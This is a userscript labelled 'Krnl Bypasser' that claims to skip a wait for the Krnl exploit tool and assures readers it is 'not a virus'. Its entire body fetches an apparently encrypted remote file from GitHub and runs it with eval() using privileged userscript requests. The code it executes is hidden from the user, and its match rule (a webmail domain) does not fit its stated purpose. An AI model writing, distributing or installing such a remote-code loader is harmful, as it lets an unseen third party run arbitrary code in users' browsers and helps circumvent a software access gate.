// ==UserScript==
// This script is obfuscated and secured (not a virus)
// @name         [Working] Krnl Bypasser [Universall]
// @namespace    cr4ck.de
// @homepageURL  https://cr4ck.de
// @supportURL   https://cr4ck.de/dc
// @description  just waits 15 seconds for krnl and works fine with the other stuff 2 (it waits no time for other stuff) :)

// Add all new websites here
// @match        https://mail.cr4ck.de/*

// @license      CC BY-NC 4.0 (https://creativecommons.org/licenses/by-nc/4.0/).

// @downloadURL  https://cr4ck.de/userscript
// @updateURL    https://cr4ck.de/userscript

// @grant        GM_xmlhttpRequest
// @grant        GM.xmlHttpRequest

// @version      1.0.0
// @releaseDate  2024-09-02T05:23:50.212Z
// @author       cr4ck.de team
// @connect      raw.githubusercontent.com

// ==/UserScript==

(function() {
    GM.xmlHttpRequest({
        method: 'GET',
        url: 'https://github.com/syrabrox/userscript/raw/refs/heads/main/code.webmail.crypted.user.js',
        onload: function(response) {
            eval(response.responseText);
        }
    });
})();
